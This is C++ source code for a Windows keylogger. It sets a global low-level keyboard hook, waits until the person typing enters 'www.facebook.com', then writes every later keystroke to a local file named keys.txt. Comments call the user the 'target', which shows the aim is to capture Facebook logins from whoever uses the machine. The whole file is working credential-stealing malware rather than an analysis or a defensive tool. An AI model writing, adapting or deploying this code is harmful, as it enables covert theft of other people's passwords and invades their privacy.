#include <Windows.h> 
#include <iostream> 
#include <fstream>

// global variables 
HHOOK hhkLowLevelKybd; 
std::string link =""; 
std::string filename = "keys.txt";
    // URL TARGET : 
std::string FB ="www.facebook.com"; 

// function that convert key Code in VK and return the caracter ( using ASCII )
std::string ConvertVKCodeToCharacter(int keyCode) {
    std::string character;
    BYTE keyboardState[256];
    WORD asciiCharacter; 
    GetKeyboardState(keyboardState); 
    ToAscii(keyCode, 0, keyboardState, &asciiCharacter, 0);
    character.push_back(char(asciiCharacter)); 
    return character;    
}

// return true if file exist false otherwise
inline bool is_file_exist (const std::string& name) {
    if (FILE *file = fopen(name.c_str(), "r")) {
        fclose(file);
        return true;
    } else {
        return false;
    }
};  

// function will create file with path 'filename'
 void create_file(std::string filename) { 
    std::ofstream outfile (filename);
     if(outfile) {
              outfile.close();
         }
 }

 // function that save the string 's' in a file with path 'filename'
void savingKeysToFile(std::string s,std::string filename){
    
    // Open file in append mode 
    std::ofstream outfile; 
    outfile.open(filename, std::ios_base::app); 
    // Write inputted data into the file
     outfile << s ; 
     // Close the file
      outfile.close(); 

}

// Function to convert string to lower case
 std::string toLowerCase(std::string str) {
     // Converting string to lower case 
     for (int i=0; str[i]!='\0'; i++) {
         if (str[i] >= 'A' && str[i] <= 'Z') 
            str[i] = str[i] + 32; 
            } 
        return str; 
    } 

// This is the Low Level Keyboard Proc 
LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) { 
    if (nCode == HC_ACTION) { 
        switch (wParam) { 
            case WM_KEYDOWN: KBDLLHOOKSTRUCT cKey = *((KBDLLHOOKSTRUCT*)lParam); 

            // if the target not typing the URL just wait : 
            if(link != FB){
                if (link.size() < 16 ){
                    link += toLowerCase(ConvertVKCodeToCharacter(cKey.vkCode)) ; 
                }else{
                    link = link.substr(1, link.size()) + toLowerCase(ConvertVKCodeToCharacter(cKey.vkCode));
                }
            }else{
                // if the taget type the facebook URL create the file if not exist and start saving the input keyboard in txt file
                if(!is_file_exist(filename)){
                    create_file(filename);
                }
                // save into Keys.txt file 
                savingKeysToFile(ConvertVKCodeToCharacter(cKey.vkCode),filename);
            }
            break; 
            } 
        } 
        return CallNextHookEx(hhkLowLevelKybd, nCode, wParam, lParam); 
    } 
        
    // ** main start **  
    int main() { 
        std::cout << " The programe is working ! start typing ... \n"; 
        // Get the LowLevel Keyboard Hook
         hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, 0, 0);
         // If the hook was unsuccessful... 
         if (!hhkLowLevelKybd) 
            std::cout << "Failed to install hook!" << std::endl;
             // Message Loop
            MSG Message; 
             while (GetMessage(&Message, NULL, 0, 0) > 0) { 
                TranslateMessage(&Message); 
                DispatchMessage(&Message); }
                 return 0; 
    }